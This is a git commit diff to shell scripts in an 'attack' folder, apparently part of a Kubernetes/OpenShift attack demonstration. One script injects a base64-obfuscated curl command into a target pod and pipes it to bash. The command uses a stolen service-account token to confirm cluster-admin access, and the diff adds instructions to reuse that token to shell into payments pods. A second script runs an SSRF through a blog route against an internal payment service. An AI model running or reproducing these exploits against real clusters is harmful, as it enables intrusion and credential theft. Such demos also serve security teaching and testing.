ec3f4d980a4fefbb0bd80f6ba3b23ce57c549105
Rodrigo Alvares <ralvares@redhat.com>
2023-10-31 10:30:32 +0100

    remove wget calls from scripts

--- attack/01_expoit_asset-cache_get_visa_token.sh
+++ attack/01_expoit_asset-cache_get_visa_token.sh
@@ -27,6 +27,12 @@ export token=$(echo ${target_info} | awk 'NF>1{print $NF}')
 commandb64='Y3VybCAtcyAtayAgXAogICAgIC1IICJDb250ZW50LXR5cGU6IGFwcGxpY2F0aW9uL2pzb24iIFwKICAgIC1IICJBdXRob3JpemF0aW9uOiBCZWFyZXIgJHt0b2tlbn0iIFwKICAgIC1kICd7ImtpbmQiOiJTZWxmU3ViamVjdEFjY2Vzc1JldmlldyIsImFwaVZlcnNpb24iOiJhdXRob3JpemF0aW9uLms4cy5pby92MSIsIm1ldGFkYXRhIjp7ImNyZWF0aW9uVGltZXN0YW1wIjpudWxsfSwic3BlYyI6eyJyZXNvdXJjZUF0dHJpYnV0ZXMiOnsidmVyYiI6IioiLCJyZXNvdXJjZSI6IioifX0sInN0YXR1cyI6eyJhbGxvd2VkIjpmYWxzZX19CicgXAogICAgaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjL2FwaXMvYXV0aG9yaXphdGlvbi5rOHMuaW8vdjEvc2VsZnN1YmplY3RhY2Nlc3NyZXZpZXdzCg=='
 inject=$(echo ${commandb64} | base64 -d | envsubst | base64 )
 curl_target $1 "echo '${inject}' | base64 -d | bash -" | grep -i -q 'allowed": true,' &&  echo $token > token && echo " ☣☣☣ Checking Token Privileges ☣☣☣" && echo ☺ - kubernetes.default.svc:443 Access Confirmed from ${hostname} && echo ☺ - Token with cluster-admin Privileges Confirmed && echo ☣☣☣ Happy Hacking ☣☣☣
+if test -f token;then
+echo ""
+echo "Use the token to remote access the POD"
+echo 'run: oc --token $(cat token) -n payments get pods'
+echo 'run: oc --token $(cat token) -n payments rsh <POD NAME>'
+fi
 }
 
 if [ -z "$target" ]
--- attack/06_blog_ssrf.sh
+++ attack/06_blog_ssrf.sh
@@ -1,2 +1,1 @@
-wget -q -O - https://$(oc -n frontend get route/blog --output jsonpath={.spec.host})/fetch?url=http://checkip.dyndns.com
-wget -q -O - https://$(oc -n frontend get route/blog --output jsonpath={.spec.host})/fetch?url=http://visa-processor-service.payments:8080
+curl -k  https://$(oc -n frontend get route/blog --output jsonpath={.spec.host})/fetch?url=http://visa-processor-service.payments:8080
